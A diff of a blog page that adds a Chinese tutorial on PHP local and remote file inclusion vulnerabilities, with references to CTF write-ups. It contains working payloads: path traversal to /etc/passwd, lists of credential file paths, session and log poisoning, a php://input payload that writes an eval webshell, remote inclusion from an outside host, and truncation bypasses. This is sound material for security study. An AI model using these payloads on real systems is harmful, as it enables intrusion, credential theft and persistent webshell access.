@@ -4,6 +4,13 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
 <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=0">
 
+  <meta name="description" content="前言文件包含
+一个文件中通过包含函数包含另外一个文件。 
+文件包含可以包含任意文件，即可以是编程文件，也可以是文本，还可以是图片。只要文件被包含，其内容会被包含文件包含，并以当前服务器脚本语言执行。 
+漏洞
+被包含的文件往往设置为变量，从而主文件可以动态地调用它。
+通过调用被包含文件时，由于用户可控">
+
 
 <link rel="alternate" href="/atom.xml" title="Gu Chuan&#39;s blog" type="application/atom+xml">
 <meta name="theme-color" content="#a1d0f6">
@@ -36,7 +43,83 @@
         </h2>
     </header>
 </article>
-<section id="post-body"></section>
+<section id="post-body"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>文件包含</code></p>
+<p>一个文件中通过包含函数包含另外一个文件。 </p>
+<p>文件包含可以包含任意文件，即可以是编程文件，也可以是文本，还可以是图片。只要文件被包含，其内容会被包含文件包含，并以当前服务器脚本语言执行。 </p>
+<p><code>漏洞</code></p>
+<p>被包含的文件往往设置为变量，从而主文件可以动态地调用它。</p>
+<p>通过调用被包含文件时，由于用户可控、没有严格的检验、可被绕过、操作敏感文件，从而导致文件泄露和恶意代码注入。</p>
+<p> 当被包含文件在服务器本地上，形成本地文件包含( Local File Include,LFI )，当被包含文件在第三方服务器上，形成远程文件包含( Remote File Include,RFI )。 </p>
+<p><code>PHP 文件包含函数</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include() 找不到被包含的文件时，生成一个警告(E_WARNING)，在错误发生后脚本会继续执行。</span><br><span class="line">include_once() 载入文件时会有内部判断机制判断前面代码是否已经载入过。</span><br><span class="line">require() 找不到被包含的文件时，生成一个致命错误(E_COMPILE_ERROR)，在错误发生后脚本会停止执行。</span><br><span class="line">require_once() 载入文件时会有内部判断机制判断前面代码是否已经载入过。</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h1><p><code>包含目录文件</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($_GET[&apos;file&apos;]);</span><br><span class="line">?&gt;</span><br><span class="line">?file=../../../../etc/passwd </span><br><span class="line">注：当被包含文件内容是php脚本，则内容会被当成php执行,当被包含文件内容不是php脚本则会读取到文件内容。</span><br><span class="line">   ./当前目录,../上一级目录。</span><br><span class="line">本地包含配合文件上传，上传一句话图片木马到服务器。</span><br><span class="line">?page=./uploadfile/xxx.jpg</span><br></pre></td></tr></table></figure>
+
+<p>通过目录遍历漏洞，可以获取到系统中其他文件的内容。</p>
+<p><code>常见的敏感信息路径</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Windows系统</span><br><span class="line">c:\boot.ini                                  // 查看系统版本</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml     // IIS配置文件</span><br><span class="line">c:\windows\repair\sam                        // 存储Windows系统初次安装的密码</span><br><span class="line">c:\ProgramFiles\mysql\my.ini                 // MySQL配置</span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD    // MySQL root密码</span><br><span class="line">c:\windows\php.ini                           // php 配置信息</span><br><span class="line"></span><br><span class="line">Linux/Unix系统</span><br><span class="line">/etc/passwd                                         // 账户信息</span><br><span class="line">/etc/shadow                                         // 账户密码文件</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf              // Apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf  // 虚拟网站配置</span><br><span class="line">/usr/local/app/php5/lib/php.ini                     // PHP相关配置</span><br><span class="line">/etc/httpd/conf/httpd.conf                          // Apache配置文件</span><br><span class="line">/etc/my.conf                                        // mysql 配置文件</span><br></pre></td></tr></table></figure>
+
+<p><code>包含session文件</code></p>
+<p> session文件一般在/tmp、/var目录下，session的文件名为sess_+sessionid，且sessionid可以通过抓包获取。</p>
+<blockquote>
+<p>/var/lib/php/sess_PHPSESSID</p>
+<p>/var/lib/php/sess_PHPSESSID</p>
+<p>/tmp/sess_PHPSESSID</p>
+<p>/tmp/sessions/sess_PHPSESSID</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$file=$_GET[&apos;file&apos;];</span><br><span class="line">$_SESSION[&quot;username&quot;]=$file;</span><br><span class="line">?&gt;</span><br><span class="line">?file=&lt;?php phpinfo();?&gt;</span><br><span class="line">?file=/var/lib/php/session/sess_sessionid</span><br><span class="line">通过phpinfo的信息，获取到session.save_path为/var/lib/php/session。通过命令执行getshall。</span><br></pre></td></tr></table></figure>
+
+<p><code>包含日志文件</code></p>
+<p>如果存在本地包含漏洞导致无法上传文件时，则可以找Apache的路径，利用包含Apache日志文件也可以获取Webshell。</p>
+<p>Apache运行后一般默认会生成两个日志文件，access.log (访问日志) 和 error.log (错误日志)。 默认情况下，日志保存路径在 /var/log/apache/。 访问日志文件记录了客户端的每次请求和服务器响应的相关信息。错误日志记录了访问失败的记录。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果访问一个不存在的资源时，?file=http://www.XXXX.com/&lt;?php phpinfo();?&gt;，则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把&lt;?php  phpinfo(); ?&gt; 写入apache的日志文件，然后可以通过包含日志文件来执行此代码。</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>相关题目 <a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two" target="_blank" rel="noopener">SHACTF-2017- Bon Appétit (100)-writeup</a> </p>
+<p>​                <a href="https://www.dazhuanlan.com/2019/12/16/5df6e06bcf85c/" target="_blank" rel="noopener">易酷CMS文件包含</a></p>
+</blockquote>
+<p><code>包含临时文件</code></p>
+<p> 向服务器上传.php 文件以form-data方式提交请求上传数据时，会生成临时文件。通过phpinfo()来获取临时文件的路径以及名称,然后临时文件在极短时间被删除的时候,需要竞争时间包含临时文件拿到webshell。 </p>
+<blockquote>
+<p>相关题目 <a href="https://chybeta.github.io/2017/08/22/XMAN夏令营-2017-babyweb-writeup/" target="_blank" rel="noopener">XMAN夏令营-2017-babyweb-writeup</a> </p>
+</blockquote>
+<h1 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h1><blockquote>
+<p>allow_url_fopen = On（是否允许打开远程文件）</p>
+<p>allow_url_include = On（是否允许include/require远程文件）</p>
+<p>一般allow_url_fopen默认为on，但allow_url_include在 php&gt;5.2 默认为off 。</p>
+</blockquote>
+<p><code>包含远程文件</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($_GET[&apos;file&apos;]);</span><br><span class="line">?&gt;</span><br><span class="line">?file=http://192.168.72.155/test.php</span><br><span class="line">?file=https://192.168.72.155/test.php</span><br><span class="line">?file=ftp://192.168.72.155/test.php</span><br><span class="line">注：如果包含远程服务器上的.php文件，得到的是被远程服务器解析过的php。所以在写一句话木马的时候就不要做成.php的文件，一般包含.txt的文件。</span><br></pre></td></tr></table></figure>
+
+<p><code>包含PHP伪协议</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">利用php://input，接受POST方法传送的变量值(allow_url_include = On、allow_url_fopen = On php&lt;5.3.0)</span><br><span class="line">?file=php://input    POST：&lt;?php phpinfo();?&gt; 或 &lt;?php system(&apos;ls&apos;);?&gt;</span><br><span class="line">?file=php://input    POST:&lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_GET[cmd]); ?&gt;&apos;);?&gt;</span><br><span class="line"></span><br><span class="line">利用php://filter，读取php文件内容。(allow_url_fopen = On)</span><br><span class="line">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br><span class="line">?file=php://filter/convert.base64-encode/resource=index.php</span><br><span class="line">?file=php://filter/read=string.toupper/resource=index.php</span><br><span class="line"></span><br><span class="line">利用file://，读取文件内容。(allow_url_fopen = On)</span><br><span class="line">?file=file://c:/boot.ini</span><br><span class="line"></span><br><span class="line">利用data://，将原本的include()文件流重定向到用户可控制的输入流中，即命令执行。(allow_url_include=On)</span><br><span class="line">?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=</span><br><span class="line">注：PHP代码不能闭合(?&gt;)</span><br><span class="line"></span><br><span class="line">利用zip://，命令执行。(PHP &gt; =5.3.0)</span><br><span class="line">?file=phar://压缩包/内部文件  ?file=phar://xxx.png/shell.php   </span><br><span class="line">写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 </span><br><span class="line"></span><br><span class="line">利用phar://，命令执行。(PHP &gt; =5.3.0)</span><br><span class="line">?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]  ?file=zip://xxx.png%23shell.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">%00截断  magic_quotes_gpc=off PHP&lt;5.3.4</span><br><span class="line">&lt;?php</span><br><span class="line">include($_GET[&apos;file&apos;].&quot;.html&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">?file=../../test.php%00</span><br><span class="line"></span><br><span class="line">%00截断目录遍历  magic_quotes_gpc=off  PHP&lt;5.3.4</span><br><span class="line">&lt;?php</span><br><span class="line">include($_GET[&apos;file&apos;].&quot;/index.php&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">?file=../../../../etc/passwd%00</span><br><span class="line"></span><br><span class="line">路径长度截断  php&lt;5.2.8 linux需要文件名长于4096字节、windows需要长于256字节，超出的部分会被丢弃。</span><br><span class="line">?file=test.txt/././././././.[...]/././././././././</span><br><span class="line"></span><br><span class="line">点号截断   php&lt;5.2.8 只适用windows，点号需要长于256字节，超出的部分会被丢弃。</span><br><span class="line">?file=test.txt..................[...]..............</span><br><span class="line"></span><br><span class="line">URL编码</span><br><span class="line">一次编码：. %2e  / %2f  \ %5c</span><br><span class="line">二次编码：.. %252e  / %252f  \ %255c</span><br><span class="line"></span><br><span class="line">问号(?) 绕过</span><br><span class="line">?file=http://192.168.72.155/test.php?</span><br><span class="line"></span><br><span class="line">井号(#) 绕过</span><br><span class="line">?file=http://192.168.72.155/test.php%23</span><br><span class="line"></span><br><span class="line">空格( ) 绕过</span><br><span class="line">?file=http://192.168.72.155/test.php%20</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a href="https://www.cnblogs.com/hack0ne/p/4603144.html" target="_blank" rel="noopener">截断原理小指南</a></p>
+<p>由于 PHP 的文件系统操作是基于 C 语言的函数的，所以它可能会以您意想不到的方式处理  <a href="https://www.php.net/manual/zh/security.filesystem.nullbytes.php" target="_blank" rel="noopener">Null 字符</a>。Null字符在 C 语言中用于标识字符串结束，一个完整的字符串是从其开头到遇见 Null 字符为止。</p>
+</blockquote>
+<p><code>JS 文件包含</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一、静态包含</span><br><span class="line">&lt;%@include file=&quot;page.txt&quot;%&gt;静态包含语句，静态包含语句先进行包含，再做处理操作。</span><br><span class="line">JSP语法规定，include指令为静态包含，只允许包含一个已经存在于服务器中的文件，而不能使用变量来控制包含某个文件，这就意味着使用include指令将不存在文件包含漏洞。</span><br><span class="line">二、动态包含</span><br><span class="line">&lt;jsp:inclde page=&quot;page.txt&quot;/&gt;动态包含语句，在运行时会先处理被包含页面，然后再包含，而且可以包含一个动态页面（变量）。但在包含一个非JSP文件扩展名时，即使其内容符合JSP语法规范，也会只读取其源代码，而不会解析其JSP代码。</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="noopener">文件包含漏洞小结</a></p>
+<p><a href="https://www.ddosi.com/b148/" target="_blank" rel="noopener">PHP文件包含漏洞</a></p>
+<p><a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">FREEBUF：文件包含漏洞</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1180857" target="_blank" rel="noopener">PHP 文件包含漏洞姿势总结</a></p>
+</section>
+    
+        
+        <h2 class="footline">
+            <a href="/tags/knowledge/#knowledge">knowledge</a>
+        </h2>
     
 
     <footer id="post-meta" class="clearfix">
